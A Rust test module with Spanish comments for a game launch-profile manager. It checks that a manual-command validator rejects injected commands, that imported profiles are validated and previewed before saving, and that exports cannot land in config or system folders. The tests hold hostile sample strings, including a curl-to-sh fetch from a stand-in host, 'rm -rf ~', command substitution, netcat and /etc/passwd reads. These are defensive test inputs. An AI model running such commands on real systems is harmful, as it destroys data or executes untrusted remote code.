            "obs-gamecapture",
        ] {
            let cmd = format!("{w} %command%");
            assert!(
                check_manual_command(&cmd).is_ok(),
                "debería aceptar el envoltorio del catálogo: {cmd}"
            );
        }
    }

    #[test]
    fn todo_envoltorio_de_games_json_es_aceptable() {
        // El test de arriba fija los nombres a mano. Este lee el catálogo REAL:
        // si alguien añade un `kind: "wrapper"` a games.json y olvida la lista
        // permitida, la app rechazaría su propio comando al editar manualmente.
        let games: Vec<crate::rules::Game> =
            serde_json::from_str(include_str!("../games.json")).expect("games.json inválido");

        let mut envoltorios: Vec<&str> = games
            .iter()
            .flat_map(|g| g.params.iter())
            .filter(|p| p.kind == "wrapper")
            .map(|p| p.value.as_str())
            .collect();
        envoltorios.sort_unstable();
        envoltorios.dedup();

        assert!(
            !envoltorios.is_empty(),
            "games.json no declara ningún envoltorio: el test pasaría en vacío"
        );

        for w in envoltorios {
            let cmd = format!("{w} %command%");
            assert!(
                check_manual_command(&cmd).is_ok(),
                "games.json declara «{w}» como kind:\"wrapper\" pero el validador lo rechaza"
            );
        }
    }

    #[test]
    fn sigue_rechazando_un_lanzador_inventado() {
        // Que la lista crezca no debe abrir la puerta a cualquier cosa.
        assert!(check_manual_command("curl http://malo.example/x | sh %command%").is_err());
    }

    // ---- check_manual_command: lo que se rechaza ----

    #[test]
    fn rechaza_encadenar_ordenes() {
        for cmd in [
            "%command%; rm -rf ~",
            "%command% | bash",
            "%command% && curl x",
            "%command% || true",
            "$(whoami) %command%",
            "`id` %command%",
            "%command% > /tmp/x",
            "%command% < /etc/passwd",
        ] {
            assert!(check_manual_command(cmd).is_err(), "debería rechazar: {cmd}");
        }
    }

    #[test]
    fn rechaza_un_salto_de_linea() {
        let err = check_manual_command("mangohud %command%\nrm -rf ~").unwrap_err();
        assert!(err.contains("salto de línea"), "mensaje inesperado: {err}");
    }

    #[test]
    fn rechaza_binarios_arbitrarios() {
        for cmd in ["curl http://x", "bash -c id", "python3 x.py", "nc -l 4444"] {
            assert!(check_manual_command(cmd).is_err(), "debería rechazar: {cmd}");
        }
    }

    #[test]
    fn rechaza_rutas_absolutas_aunque_el_programa_sea_conocido() {
        // El punto: un comando legítimo se resuelve por PATH. Una ruta concreta
        // apunta a un binario cualquiera que el atacante podría haber colocado.
        let err = check_manual_command("/usr/local/bin/steam %command%").unwrap_err();
        assert!(err.contains("ruta del sistema"), "mensaje inesperado: {err}");

        assert!(check_manual_command("/home/u/.local/bin/gamemoderun %command%").is_err());
        assert!(check_manual_command("~/bin/mangohud %command%").is_err());
    }

    #[test]
    fn rechaza_vacio_y_demasiado_largo() {
        assert!(check_manual_command("   ").is_err());
        let long = format!("mangohud %command% {}", "a".repeat(MAX_MANUAL_COMMAND_LENGTH));
        assert!(check_manual_command(&long).is_err());
    }

    // ---- validate_imported_profile: contenido ----

    /// Perfil mínimo válido, para partir de algo que pasa.
    fn perfil_valido() -> Profile {
        Profile {
            id: "440_20260101120000".to_string(),
            name: "Mi perfil".to_string(),
            appid: 440,
            game_name: "TF2".to_string(),
            enabled_params: vec![true, false],
            selected_community_recs: vec![0],
            selected_engine_recs: vec![],
            force_proton: false,
            expert_mode: false,
            manual_command: None,
            use_manual_command: false,
            notes: None,
            created_at: "2026-01-01 12:00:00".to_string(),
            updated_at: "2026-01-01 12:00:00".to_string(),
            order: 0,
            version: Some(PROFILE_SCHEMA_VERSION),
        }
    }

    #[test]
    fn un_perfil_normal_pasa_la_validacion() {
        assert!(validate_imported_profile(&perfil_valido()).is_ok());
    }

    #[test]
    fn un_perfil_sin_version_se_acepta_como_v1() {
        // Los archivos anteriores a este campo no lo llevan y deben seguir
        // entrando: `version: None` equivale a la 1.
        let mut p = perfil_valido();
        p.version = None;
        assert!(validate_imported_profile(&p).is_ok());
    }

    #[test]
    fn una_version_del_futuro_se_rechaza_con_un_mensaje_util() {
        let mut p = perfil_valido();
        p.version = Some(PROFILE_SCHEMA_VERSION + 1);
        let err = validate_imported_profile(&p).unwrap_err();
        assert!(err.contains("versión más nueva"), "mensaje inesperado: {err}");
        // Debe decirle qué hacer, no solo que no.
        assert!(err.contains("Actualiza"));
    }

    #[test]
    fn rechaza_un_perfil_sin_nombre() {
        let mut p = perfil_valido();
        p.name = "   ".to_string();
        assert!(validate_imported_profile(&p).is_err());
    }

    #[test]
    fn rechaza_textos_desmesurados() {
        // El caso real: 5 MB de archivo permitían un `name` de casi 4 MB que
        // pasaba la validación global y se guardaba entero.
        let mut p = perfil_valido();
        p.name = "a".repeat(MAX_PROFILE_TEXT + 1);
        assert!(validate_imported_profile(&p).is_err());

        let mut p = perfil_valido();
        p.game_name = "a".repeat(MAX_PROFILE_TEXT + 1);
        assert!(validate_imported_profile(&p).is_err());

        let mut p = perfil_valido();
        p.notes = Some("a".repeat(MAX_PROFILE_NOTES + 1));
        assert!(validate_imported_profile(&p).is_err());
    }

    #[test]
    fn acepta_textos_justo_en_el_limite() {
        let mut p = perfil_valido();
        p.name = "a".repeat(MAX_PROFILE_TEXT);
        p.notes = Some("a".repeat(MAX_PROFILE_NOTES));
        assert!(validate_imported_profile(&p).is_ok());
    }

    #[test]
    fn rechaza_listas_de_selecciones_desmesuradas() {
        let mut p = perfil_valido();
        p.selected_community_recs = (0..MAX_SELECTIONS + 1).collect();
        let err = validate_imported_profile(&p).unwrap_err();
        assert!(err.contains("recomendaciones de la comunidad"), "mensaje: {err}");

        let mut p = perfil_valido();
        p.selected_engine_recs = (0..MAX_SELECTIONS + 1).collect();
        assert!(validate_imported_profile(&p).is_err());
    }

    #[test]
    fn rechaza_mas_parametros_de_los_que_tiene_el_juego() {
        // Los índices de `enabled_params` se usan sobre `rules::for_appid(appid).params`:
        // una lista más larga deja el perfil incoherente.
        let mut p = perfil_valido();
        let limite = crate::rules::for_appid(440).params.len();
        p.enabled_params = vec![false; limite + 1];
        let err = validate_imported_profile(&p).unwrap_err();
        assert!(err.contains("parámetros"), "mensaje: {err}");
    }

    #[test]
    fn rechaza_indices_de_recomendacion_fuera_de_rango() {
        let mut p = perfil_valido();
        p.selected_community_recs = vec![MAX_SELECTIONS];
        let err = validate_imported_profile(&p).unwrap_err();
        assert!(err.contains("no existe"), "mensaje: {err}");

        let mut p = perfil_valido();
        p.selected_engine_recs = vec![MAX_SELECTIONS + 5];
        assert!(validate_imported_profile(&p).is_err());
    }

    // ---- preview_from_content: ver antes de guardar ----

    /// JSON de un perfil válido, con los campos que interesan en cada test.
    fn json_perfil(extra: &str) -> String {
        format!(
            r#"{{"id":"p1","name":"Mi perfil","appid":440,"game_name":"TF2",
                "enabled_params":[],"selected_community_recs":[],"selected_engine_recs":[],
                "force_proton":false,"expert_mode":false,"use_manual_command":false,
                "created_at":"2026-01-01 12:00:00","updated_at":"2026-01-01 12:00:00"{}}}"#,
            extra
        )
    }

    #[test]
    fn la_vista_previa_describe_lo_que_se_importaria() {
        let json = format!(
            "[{}, {}]",
            json_perfil("").replace("p1", "p1"),
            json_perfil(r#","manual_command":"gamemoderun %command%","use_manual_command":true"#)
                .replace("p1", "p2")
                .replace("Mi perfil", "Otro")
        );

        let preview = preview_from_content(&json).unwrap();
        assert_eq!(preview.profiles.len(), 2);
        assert_eq!(preview.duplicates, 0);
        assert_eq!(preview.stripped_commands, 0);

        let segundo = &preview.profiles[1];
        assert_eq!(segundo.name, "Otro");
        assert!(segundo.keeps_manual_command);
        assert_eq!(segundo.manual_command.as_deref(), Some("gamemoderun %command%"));
        assert!(segundo.manual_command_reason.is_empty());
    }

    #[test]
    fn la_vista_previa_avisa_del_comando_que_se_va_a_quitar() {
        // Este es el motivo de existir de todo esto: que el usuario lo vea ANTES.
        let json = json_perfil(
            r#","manual_command":"%command%; curl http://malo.example/x | sh","use_manual_command":true"#,
        );

        let preview = preview_from_content(&json).unwrap();
        assert_eq!(preview.stripped_commands, 1);

        let p = &preview.profiles[0];
        assert!(!p.keeps_manual_command);
        assert!(p.manual_command_reason.contains(';'), "motivo: {}", p.manual_command_reason);
        // El comando se sigue enseñando: esconderlo impediría reconocerlo.
        assert!(p.manual_command.as_deref().unwrap().contains("curl"));
    }

    #[test]
    fn la_vista_previa_no_escribe_nada_en_disco() {
        // Si esto falla, la separación preview/apply no existe de verdad.
        let json = json_perfil("");
        let preview = preview_from_content(&json).unwrap();
        assert_eq!(preview.profiles.len(), 1);

        // Nada de este perfil debe haberse guardado.
        let guardados = load_profiles_data();
        assert!(!guardados.profiles.iter().any(|p| p.id == "p1"));
    }

    #[test]
    fn la_vista_previa_marca_los_duplicados() {
        let json = format!(
            "[{}, {}]",
            json_perfil("").replace("p1", "p1"),
            json_perfil("").replace("p1", "p2")
        );
        let preview = preview_from_content(&json).unwrap();
        // Ninguno de los dos está guardado, así que ninguno es duplicado.
        assert_eq!(preview.duplicates, 0);
        assert_eq!(preview.profiles.len(), 2);
    }

    #[test]
    fn la_vista_previa_rechaza_un_archivo_invalido() {
        // Misma puerta que la importación real: no puede aceptar lo que apply rechaza.
        assert!(preview_from_content("no es json").is_err());
        assert!(preview_from_content("[]").is_err());
        assert!(preview_from_content("123").is_err());
    }

    /// El perfil llega con `appid` de un juego cuyas opciones cambian: la vista
    /// previa debe enseñar los NOMBRES de las opciones, no sus índices.
    #[test]
    fn la_vista_previa_traduce_los_parametros_a_texto() {
        let n = crate::rules::for_appid(440).params.len().min(2);
        let mut enabled = vec!["false"; n];
        for e in enabled.iter_mut() {
            *e = "true";
        }
        let json = json_perfil(&format!(
            r#","enabled_params":[{}]"#,
            enabled.join(",")
        ));
        let preview = preview_from_content(&json).unwrap();
        let labels = &preview.profiles[0].enabled_params;
        assert_eq!(labels.len(), n);
        // El primer valor de rules para ese appid, no el índice "0".
        let esperado = &crate::rules::for_appid(440).params[0].value;
        assert_eq!(&labels[0], esperado);
    }

    #[test]
    fn la_lista_permitida_coincide_con_la_del_frontend() {
        // El frontend tiene su propia lista (`ALLOWED_COMMANDS` en command.ts).
        // Este test no puede leer TypeScript, así que fija los nombres aquí: si
        // alguien añade uno en un lado y no en el otro, esto salta.
        let mut esperados: Vec<&str> = vec![
            "gamemoderun", "mangohud", "gamescope", "prime-run", "obs-gamecapture",
            "vkbasalt", "game-performance", "scx_lavd", "WINEDLLOVERRIDES", "steam",
            "steam-native", "steam-runtime", "protontricks", "umu-run", "proton", "wine",
            "wine64", "winetricks",
        ];
        esperados.sort_unstable();
        let mut actuales: Vec<&str> = ALLOWED_MANUAL_COMMANDS.to_vec();
        actuales.sort_unstable();
        assert_eq!(actuales, esperados);
    }
    #[test]
    fn todo_envoltorio_conocido_es_aceptable_como_comando_manual() {
        // La lista de envoltorios vive en `preflight.rs` (qué comprobar en el
        // sistema) y en el frontend (cómo clasificar un parámetro). Si uno de los
        // dos se queda corto, el comando sale mal: el envoltorio acaba DETRÁS de
        // %command% y se pasa como argumento del juego. Ese fue el bug con
        // `prime-run`, `vkbasalt`, `obs-gamecapture`, `game-performance` y `scx_lavd`.
        //
        // Aquí se comprueba la otra mitad en Rust: que un envoltorio conocido
        // también puede encabezar un comando manual, o «Editar manualmente» daría
        // error con un comando que la propia app acaba de generar.
        for envoltorio in crate::preflight::KNOWN_WRAPPERS {
            assert!(
                ALLOWED_MANUAL_COMMANDS.contains(&envoltorio),
                "«{envoltorio}» está en preflight::KNOWN_WRAPPERS pero no en ALLOWED_MANUAL_COMMANDS"
            );
            let cmd = format!("{envoltorio} %command%");
            assert!(
                check_manual_command(&cmd).is_ok(),
                "«{cmd}» debería ser aceptable: {:?}",
                check_manual_command(&cmd)
            );
        }
    }

    // ---- check_export_destination: dónde se puede escribir una exportación ----
    //
    // Antes bastaba con que la carpeta existiera, así que un perfil exportado
    // podía acabar en `/etc` o en `~/.config/autostart`. Estos tests fijan que
    // ya no, y que los sitios normales siguen funcionando.

    /// Carpeta temporal que simula `$HOME` para no depender del usuario real.
    fn home_falso(nombre: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "thoriapp-export-{}-{}",
            nombre,
            std::process::id()
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("Descargas")).unwrap();
        fs::create_dir_all(dir.join(".config/autostart")).unwrap();
        fs::create_dir_all(dir.join("proyectos/mis-perfiles")).unwrap();
        dir.canonicalize().unwrap()
    }

    /// Ejecuta la comprobación REAL con un `$HOME` inyectado, para no tocar el
    /// del usuario que corre los tests.
    fn con_home(path: &Path, home: &Path) -> Result<(), String> {
        check_export_destination_in(path, home)
    }

    #[test]
    fn la_exportacion_normal_sigue_funcionando() {
        let home = home_falso("normal");
        // Los sitios de toda la vida: Descargas, Escritorio, una carpeta propia...
        for rel in [
            "Descargas/perfiles.json",
            "proyectos/mis-perfiles/copia.json",
        ] {
            assert!(
                con_home(&home.join(rel), &home).is_ok(),
                "debería permitir {rel}: {:?}",
                con_home(&home.join(rel), &home)
            );
        }
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn no_se_puede_exportar_dentro_de_una_carpeta_de_configuracion() {
        let home = home_falso("config");
        // El caso que motivaba todo esto: un .json en autostart es un archivo que
        // el sistema carga solo.
        for rel in [
            ".config/autostart/evil.json",
            ".config/x.json",
            ".ssh/clave.json",
        ] {
            assert!(
                con_home(&home.join(rel), &home).is_err(),
                "no debería permitir {rel}"
            );
        }
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn no_se_puede_exportar_en_carpetas_del_sistema() {
        let home = home_falso("sistema");
        for ruta in ["/etc/evil.json", "/usr/share/evil.json", "/root/evil.json"] {
            assert!(
                con_home(Path::new(ruta), &home).is_err(),
                "no debería permitir {ruta}"
            );
        }
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn la_exportacion_tiene_que_ser_json() {
        let home = home_falso("ext");
        assert!(con_home(&home.join("Descargas/perfil.json"), &home).is_ok());
        // Un .sh en Descargas sí es ejecutable por doble clic en algunos escritorios.
        for nombre in ["perfil.sh", "perfil.desktop", "perfil", "perfil.js"] {
            assert!(
                con_home(&home.join("Descargas").join(nombre), &home).is_err(),
                "no debería permitir {nombre}"
            );
        }
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn la_extension_json_se_acepta_en_mayusculas() {
        let home = home_falso("mayus");
        assert!(con_home(&home.join("Descargas/Perfil.JSON"), &home).is_ok());
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn no_se_exporta_a_un_archivo_oculto() {
        let home = home_falso("oculto");
        assert!(con_home(&home.join("Descargas/.perfil.json"), &home).is_err());
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn resolve_export_path_aplica_la_comprobacion_de_verdad() {
        // Los tests de arriba llaman a `check_export_destination_in`, que es donde
        // vive la lógica. Este comprueba el paso completo: que `resolve_export_path`
        // NO olvide llamarla. Sin esto, alguien podría quitar la llamada y todo
        // seguiría en verde.
        let home_real = dirs::home_dir().unwrap();
        let dentro_de_config = home_real.join(".config/thoriapp-test-export.json");
        let err = resolve_export_path(
            dentro_de_config.to_str().unwrap(),
            DEFAULT_EXPORT_NAME,
        )
        .unwrap_err();
        assert!(
            err.contains("configuración") || err.contains("configuracion"),
            "mensaje inesperado: {err}"
        );

        // Y una ruta del sistema también se rechaza en el paso completo.
        let err = resolve_export_path("/etc/thoriapp-test.json", DEFAULT_EXPORT_NAME).unwrap_err();
        assert!(!err.is_empty(), "debería rechazar /etc");

        // Una exportación normal sigue pasando (aunque no se escribe nada aquí).
        let normal = std::env::temp_dir().join("thoriapp-test-copia.json");
        assert!(
            resolve_export_path(normal.to_str().unwrap(), DEFAULT_EXPORT_NAME).is_ok(),
            "una ruta normal debería aceptarse"
        );
    }

    #[test]
    fn matriz_de_rutas_que_antes_funcionaban() {
        // Objetivo: no perder funcionalidad. Estas rutas se podían exportar
        // antes del cambio y tienen que seguir funcionando.
        let home = dirs::home_dir().unwrap().canonicalize().unwrap();

        let permitidas = [
            "~/perfil.json",                       // el valor por defecto antiguo
            "~/Descargas/perfil.json",
            "~/Escritorio/perfil.json",
            "~/Documents/perfil.json",
            "~/proyectos/juego/perfil.json",       // carpeta propia cualquiera
            "~/.thoriapp-backups/perfil.json",     // subcarpeta oculta propia (pero no de config)
        ];
        for ruta in permitidas {
            let p = if let Some(resto) = ruta.strip_prefix("~/") {
                home.join(resto)
            } else {
                PathBuf::from(ruta)
            };
            // Solo se valida la ubicación; no se escribe nada.
            assert!(
                check_export_destination_in(&p, &home).is_ok(),
                "antes funcionaba y ahora no: {ruta} -> {:?}",
                check_export_destination_in(&p, &home)
            );
        }

    }

    #[test]
    fn una_carpeta_de_destino_que_falta_se_crea_sola() {
        // `~/Descargas` no existe en todas las instalaciones (el nombre depende
        // del idioma). El valor por defecto de la interfaz apunta ahí, así que la
        // carpeta tiene que crearse en vez de fallar con «no existe».
        // `resolve_export_path` usa el `$HOME` real, así que se prueba con una
        // ruta bajo /tmp, que también está permitida.
        let en_tmp = std::env::temp_dir().join("thoriapp-test-crear-carpeta/perfil.json");
        let _ = fs::remove_dir_all(en_tmp.parent().unwrap());
        assert!(!en_tmp.parent().unwrap().exists());

        let resuelta = resolve_export_path(en_tmp.to_str().unwrap(), DEFAULT_EXPORT_NAME)
            .expect("debería crear la carpeta y aceptar la ruta");
        assert!(
            resuelta.parent().unwrap().is_dir(),
            "la carpeta de destino debería existir"
        );

        let _ = fs::remove_dir_all(en_tmp.parent().unwrap());
    }

    #[test]
    fn el_tmp_del_sistema_se_permite_para_no_romper_usos_temporales() {
        let home = home_falso("tmp");
        assert!(con_home(Path::new("/tmp/respaldo.json"), &home).is_ok());
        let _ = fs::remove_dir_all(&home);
    }
}

